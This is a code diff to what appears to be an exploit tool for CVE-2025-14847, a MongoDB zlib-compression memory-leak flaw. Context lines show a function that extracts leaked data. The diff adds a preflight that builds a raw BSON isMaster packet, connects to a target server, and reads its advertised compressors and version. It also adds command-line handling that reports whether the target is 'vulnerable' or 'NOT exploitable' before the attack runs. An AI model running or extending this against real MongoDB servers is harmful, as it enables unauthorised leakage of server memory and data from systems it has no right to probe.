@@ -180,6 +180,118 @@ def extract_leaks(response):
     
     return leaks
 
+def check_compression_support(host, port, timeout=5):
+    """Check if the target MongoDB server supports zlib compression.
+
+    Sends an OP_MSG hello/isMaster with compression:[\"zlib\",\"snappy\"] and
+    checks if the server's response advertises compression support.
+
+    Returns:
+        dict with keys:
+            supported (bool): True if zlib compression is supported
+            compressors (list): List of compressor names the server supports
+            version (str): MongoDB version if available
+            error (str|None): Error message if check failed
+    """
+    # Build isMaster with compression negotiation
+    # BSON: {isMaster: 1, compression: ["zlib", "snappy"], $db: "admin"}
+    bson_parts = []
+    # isMaster: 1
+    bson_parts.append(b'\x10isMaster\x00\x01\x00\x00\x00')
+    # compression: ["zlib", "snappy"]
+    arr_content = (
+        b'\x020\x00\x05\x00\x00\x00zlib\x00'
+        b'\x021\x00\x07\x00\x00\x00snappy\x00'
+        b'\x00'
+    )
+    arr_bson = struct.pack('<i', 4 + len(arr_content)) + arr_content
+    bson_parts.append(b'\x04compression\x00' + arr_bson)
+    # $db: "admin"
+    bson_parts.append(b'\x02$db\x00\x06\x00\x00\x00admin\x00')
+
+    bson_body = b''.join(bson_parts) + b'\x00'
+    bson_doc = struct.pack('<i', 4 + len(bson_body)) + bson_body
+
+    section = b'\x00' + bson_doc
+    op_msg = struct.pack('<I', 0) + section
+    msg_len = 16 + len(op_msg)
+    header = struct.pack('<iiiI', msg_len, 1, 0, 2013)
+
+    result = {
+        'supported': False,
+        'compressors': [],
+        'version': None,
+        'error': None,
+    }
+
+    try:
+        sock = socket.socket()
+        sock.settimeout(timeout)
+        sock.connect((host, port))
+        sock.sendall(header + op_msg)
+
+        response = b''
+        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+        sock.close()
+    except Exception as e:
+        result['error'] = str(e)
+        return result
+
+    if not response:
+        result['error'] = 'No response from server'
+        return result
+
+    # Parse response for compression and version fields
+    # Quick scan of the raw bytes for known field patterns
+    resp_bytes = response
+    resp_latin = resp_bytes.decode('latin-1', errors='replace')
+
+    # Check for "compression" BSON array in response
+    # BSON array field: \x04compression\x00 + array_doc
+    comp_idx = resp_bytes.find(b'\x04compression\x00')
+    if comp_idx >= 0:
+        # Parse the array to find compressor names
+        try:
+            arr_start = comp_idx + len(b'\x04compression\x00')
+            arr_len = struct.unpack('<i', resp_bytes[arr_start:arr_start+4])[0]
+            arr_data = resp_bytes[arr_start:arr_start+arr_len]
+            pos = 4  # skip length
+            while pos < len(arr_data) - 1:
+                elem_type = arr_data[pos]
+                pos += 1
+                # Skip field name (e.g., "0", "1")
+                null_pos = arr_data.index(b'\x00', pos)
+                pos = null_pos + 1
+                if elem_type == 2:  # string
+                    str_len = struct.unpack('<i', arr_data[pos:pos+4])[0]
+                    pos += 4
+                    val = arr_data[pos:pos+str_len-1].decode('utf-8', errors='replace')
+                    result['compressors'].append(val)
+                    pos += str_len
+                else:
+                    break
+        except (struct.error, ValueError, IndexError):
+            pass
+
+    result['supported'] = 'zlib' in result['compressors']
+
+    # Try to extract version string
+    ver_idx = resp_bytes.find(b'\x02version\x00')
+    if ver_idx >= 0:
+        try:
+            str_start = ver_idx + len(b'\x02version\x00')
+            str_len = struct.unpack('<i', resp_bytes[str_start:str_start+4])[0]
+            result['version'] = resp_bytes[str_start+4:str_start+4+str_len-1].decode('utf-8')
+        except (struct.error, IndexError):
+            pass
+
+    return result
+
+
 def main():
     examples = (
         "Examples:\n"
@@ -256,9 +368,62 @@ def main():
                         help='Auto-size TUI rows based on terminal height')
     parser.add_argument('--tui-refresh', type=float, default=1.0, help='TUI refresh interval (seconds)')
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
+    parser.add_argument('--skip-compression-check', action='store_true',
+                        help='Skip the compression support preflight check')
     args = parser.parse_args()
 
     console = Console()
+
+    # ── Compression support preflight ──
+    if not args.skip_compression_check:
+        host = args.host
+        port = args.port
+        if args.hit and not args.host:
+            pass  # hit replay mode doesn't need preflight
+        else:
+            comp_result = check_compression_support(host, port, timeout=min(args.timeout * 2, 10))
+            if comp_result['error']:
+                console.print(
+                    f"[bold yellow][!][/bold yellow] Compression check failed: "
+                    f"{comp_result['error']}"
+                )
+                console.print(
+                    "[bold yellow][!][/bold yellow] Continuing anyway "
+                    "(use --skip-compression-check to suppress)"
+                )
+            elif not comp_result['supported']:
+                ver_str = f" (v{comp_result['version']})" if comp_result['version'] else ""
+                compressors = comp_result['compressors']
+                if compressors:
+                    console.print(
+                        f"[bold yellow][!][/bold yellow] Target{ver_str} supports "
+                        f"compression: {compressors} but NOT zlib"
+                    )
+                    console.print(
+                        "[bold red][!][/bold red] CVE-2025-14847 requires zlib "
+                        "compression. Target is NOT exploitable."
+                    )
+                else:
+                    console.print(
+                        f"[bold red][!][/bold red] Target{ver_str} does NOT support "
+                        f"compression. CVE-2025-14847 requires zlib."
+                    )
+                    console.print(
+                        "[bold red][!][/bold red] The server will silently drop "
+                        "OP_COMPRESSED messages. Aborting."
+                    )
+                console.print(
+                    "[dim]Hint: compression must be enabled in mongod.conf "
+                    "(net.compression.compressors: zlib)[/dim]"
+                )
+                if not compressors:
+                    return
+            else:
+                ver_str = f" (v{comp_result['version']})" if comp_result['version'] else ""
+                console.print(
+                    f"[bold green][+][/bold green] Target{ver_str} supports zlib "
+                    f"compression — vulnerable to CVE-2025-14847"
+                )
 
     def ascii_preview(data, limit):
         view = data[:limit]
